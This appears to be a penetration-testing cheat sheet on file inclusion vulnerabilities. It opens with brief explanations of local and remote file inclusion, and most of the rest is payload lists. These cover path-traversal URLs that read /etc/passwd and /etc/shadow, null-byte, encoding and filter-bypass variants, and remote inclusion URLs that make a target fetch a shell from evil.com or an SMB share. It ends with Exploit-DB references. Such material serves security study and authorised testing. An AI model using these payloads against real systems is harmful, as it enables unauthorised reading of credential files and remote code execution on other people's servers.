# Concept

## File Inclusion

The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. This attack is run when an application builds a path to executable code using an attacker-controlled variable in a way that allows the attacker to control which file is executed at run time. A file include vulnerability is distinct from a generic directory traversal attack (path traversal attack), in that directory traversal is a way of gaining unauthorized file system access.

### Remote File Inclusion

Remote file inclusion (RFI) occurs when the web application downloads and executes a remote file. These remote files are usually obtained in the form of an HTTP or FTP URI as a user-supplied parameter to the web application.

### Local File Inclusion

Local file inclusion (LFI) is similar to a remote file inclusion vulnerability except instead of including remote files, only local files i.e. files on the current server can be included for execution. This issue can still lead to remote code execution by including a file that contains attacker-controlled data such as the web server's access logs.

### LFI Files - Linux

```
/etc/passwd
/etc/shadow
/etc/knockd.conf
```

### &#x20;LFI Basic - Linux

```
http://192.168.128.10/menu.php?file=/etc/passwd
http://192.168.128.10/menu.php?file=../etc/passwd
http://192.168.128.10/menu.php?file=../../etc/passwd
http://192.168.128.10/menu.php?file=../../../etc/passwd
http://192.168.128.10/menu.php?file=../../../../../../../../../../etc/passwd
```

### &#x20;LFI Basic - Windows

```
http://192.168.128.10/menu.php?file=c:\windows\system32\drivers\etc\hosts
```

### &#x20;LFI Null byte

In versions of PHP below 5.3.4 we can terminate with null byte.\


```
http://192.168.128.10/menu.php?file=/etc/passwd%00
```

### &#x20;LFI Double encoding

```
http://192.168.128.10/menu.php?file=%252fetc%252fpasswd
http://192.168.128.10/menu.php?file=%252e%252e%252fetc%252fpasswd
```

### &#x20;LFI UTF encoding

```
http://192.168.128.10/menu.php?file=/etc/passwd
http://192.168.128.10/menu.php?file=%c0%ae%c0%ae/etc/passwd
```

### &#x20;LFI Filter bypass

```
http://192.168.128.10/menu.php?file=../../etc/passwd
http://192.168.128.10/menu.php?file=....//....//etc/passwd
http://192.168.128.10/menu.php?file=..///////..////..//////etc/passwd
http://192.168.128.10/menu.php?file=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

### &#x20;Some tricks

```bash
# In the case below, 
nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt
# Add ../ at the end of URL
nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt../
```

### &#x20;RFI Basic - Linux

```
http://example.com/index.php?page=http://evil.com/shell.txt
```

### &#x20;RFI Null byte

```
http://example.com/index.php?page=http://evil.com/shell.txt%00
```

### &#x20;RFI Double encoding

```
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

### &#x20;RFI SMB trick - Windows

```bash
# When allow_url_include and allow_url_fopen are set to Off. 
# It is still possible to include a remote file on Windows box 
# using the smb protocol.
1. Create a share open to everyone
2. Write a PHP code inside a file : shell.php
3. Include it 
http://example.com/index.php?page=\\10.0.0.1\share\shell.php
```

### Exploit DB

```bash
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection (https://www.exploit-db.com/exploits/24044)
Elastix 2.2.0 - 'graph.php' Local File Inclusion (https://www.exploit-db.com/exploits/37637)
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (https://www.exploit-db.com/exploits/2017)
Advanced Comment System 1.0 - Multiple Remote File Inclusions (https://www.exploit-db.com/exploits/9623)
Simple Text-File Login script 1.0.6 (https://www.exploit-db.com/exploits/7444)
```

&#x20;
